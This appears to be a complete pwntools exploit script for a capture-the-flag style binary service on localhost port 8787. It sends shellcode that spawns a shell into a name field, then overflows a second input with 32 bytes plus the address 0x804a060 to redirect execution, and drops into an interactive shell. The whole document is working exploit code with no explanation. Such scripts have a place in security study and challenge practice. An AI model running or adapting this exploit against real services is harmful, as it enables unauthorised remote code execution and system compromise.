#!/usr/bin/env python
from pwn import *

r = remote("127.0.0.1",8787)

r.recvuntil("Name:")
r.sendline(asm(shellcraft.sh()))
r.recvuntil("best:")
r.sendline("a"*32+p32(0x804a060))
r.interactive()

